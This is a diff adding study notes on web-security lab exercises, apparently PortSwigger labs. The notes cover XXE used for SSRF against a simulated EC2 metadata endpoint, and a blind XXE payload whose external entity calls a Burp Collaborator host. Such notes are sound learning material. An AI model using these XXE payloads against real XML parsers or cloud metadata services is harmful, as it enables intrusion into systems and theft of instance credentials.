@@ -12,3 +12,19 @@
 ```
 
 ![image](https://github.com/user-attachments/assets/8b7cc000-507d-4896-95cc-c87e5ad1c674)
+
+## Exploiting XXE to perform SSRF attacks 
+- Check stock feature parses XML input and returns any unexpected values in the response. Lab is running a simulated EC2 metadata endpoint at the default URL, which is https://169.254.169.254/. Endpoint can be used to retrieve data about the instance, some of which may be sensitive.
+
+![image](https://github.com/user-attachments/assets/9245f007-a1d3-48ce-816c-5e6546fc67be)
+
+## Blind XXE with out-of-band interaction
+- Lab has check stock feature that parses XML input but does not display the result. Can detect blind XXE by triggering out-of-band-interactions with an external domain. To solve the lab, use external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://2uxjy21khbxivrd3pm9imsl7jyppdf14.oastify.com"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
+```
+
+- You should see a DNS and HTTP request in your Collaborator. 
